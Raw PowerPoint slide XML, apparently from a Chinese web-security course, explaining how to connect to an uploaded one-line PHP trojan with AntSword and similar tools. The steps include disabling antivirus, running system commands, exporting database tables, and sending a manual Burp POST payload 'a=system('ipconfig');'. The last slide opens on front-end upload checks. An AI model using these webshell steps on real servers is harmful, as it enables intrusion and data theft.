                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
              </a:rPr>
              <a:t>WebShell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
              </a:rPr>
              <a:t>的连接工具与实操步骤</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" b="1">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="文本框 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="669925" y="2113915"/>
            <a:ext cx="10490200" cy="645160"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>需使用专用工具连接一句话木马，常用工具包括中国菜刀、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>C </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>刀、蚁剑，三者用法类似，以下以</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> “</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>蚁剑</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>” </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>为例讲解完整流程：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="文本框 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="669925" y="2909570"/>
            <a:ext cx="10427335" cy="922020"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0"/>
              <a:t>1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>工具使用前提</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0"/>
              <a:t>·  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>关闭本地安全软件（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>360</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>、金山毒霸等）和防火墙，避免工具被查杀；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0"/>
              <a:t>·</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>   </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>确保一句话木马已成功上传至目标服务器，且知晓其访问路径（如</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>http://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>ip/upload/1.php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>）。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="图片 8"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="9087485" y="4057015"/>
            <a:ext cx="2889885" cy="1944370"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="文本框 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="669925" y="3982085"/>
            <a:ext cx="8329295" cy="2306955"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0"/>
              <a:t>2. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>连接步骤（蚁剑）</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>1.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>打开蚁剑，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>右键，点击</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> “</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>添加数据</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>2.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>填写核心配置：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>·  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>URL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>：木马的完整访问路径（如</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>http://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>ip/upload/1.php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>）；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>·  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>连接密码：一句话木马中定义的密码（如</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>a</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>）；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>·  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>脚本类型：选择对应木马语言（如</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> PHP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>）；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>·  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>编码：默认</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> UTF-8</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>（若出现乱码可切换</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> GBK</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>）；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>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文件上传</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>入门</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="灯片编号占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:p>
            <a:fld id="{5DD3DB80-B894-403A-B48E-6FDC1A72010E}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US" smtClean="0"/>
            </a:fld>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="文本框 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="669925" y="1503045"/>
            <a:ext cx="4649470"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en-US" altLang="zh-CN" sz="2400" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
              </a:rPr>
              <a:t>WebShell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
              </a:rPr>
              <a:t>的连接工具与实操步骤</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" b="1">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="文本框 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="669925" y="2147570"/>
            <a:ext cx="10850245" cy="1476375"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>3.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>点击</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> “</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>测试连接</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>，提示</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> “</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>连接成功</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>” </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>后点击</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> “</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>添加</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>4.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>双击左侧新增的连接，即可进入控制界面，核心功能包括：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>·  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>文件管理：浏览服务器目录，对文件进行增删改查；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>·  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>虚拟终端：执行系统命令（如</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>ipconfig</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>whoami</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>ls</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>）；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>·  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>数据库管理：配置数据库账号密码后，连接数据库执行</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> SQL </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>命令（如查询用户表、导出数据）。</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="文本框 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="669925" y="4134485"/>
            <a:ext cx="10850245" cy="2030095"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0"/>
              <a:t>3. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>浏览器</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>手动连接（无工具应急方案）</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>若无法使用专用工具，可通过</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> BP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>抓包构造</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> POST </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>请求连接：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>1.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>打开</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> BP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>，拦截访问木马路径的请求（如</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>http://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>ip/upload/1.php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>）；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>2.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>将请求方法改为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> POST</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>，在请求体中添加参数：密码</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>需执行的命令（如</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>a=system('ipconfig');</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>）；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>3.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>点击</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> “</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>发送</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>，响应包中即可显示命令执行结果（如</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>地址信息）。</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="zh-CN" altLang="en-US"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绕过技巧</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="灯片编号占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:p>
            <a:fld id="{5DD3DB80-B894-403A-B48E-6FDC1A72010E}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US" smtClean="0"/>
            </a:fld>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="文本框 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="805815" y="1503045"/>
            <a:ext cx="1477010"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zh-CN" altLang="en-US" sz="2400" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
              </a:rPr>
              <a:t>前端</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
              </a:rPr>
              <a:t>检测</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" b="1">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="文本框 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="669925" y="2228850"/>
            <a:ext cx="5281930" cy="1229995"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>如何判断？</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>       </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>在浏览器提示</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>文件类型不正确</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>”</a:t>
